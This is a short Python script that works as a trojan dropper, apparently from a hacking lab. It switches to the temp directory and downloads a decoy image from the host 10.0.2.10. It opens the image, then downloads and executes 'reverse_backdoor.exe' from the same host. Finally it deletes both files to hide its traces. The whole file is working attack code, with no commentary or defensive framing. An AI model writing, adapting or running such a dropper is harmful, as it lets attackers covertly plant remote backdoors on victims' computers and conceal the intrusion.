#!/usr/bin/env python

import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.10/evil-files/yes.jpg")
subprocess.Popen("yes.jpg", shell=True)

download("http://10.0.2.10/evil-files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("yes.jpg")
os.remove("reverse_backdoor.exe")
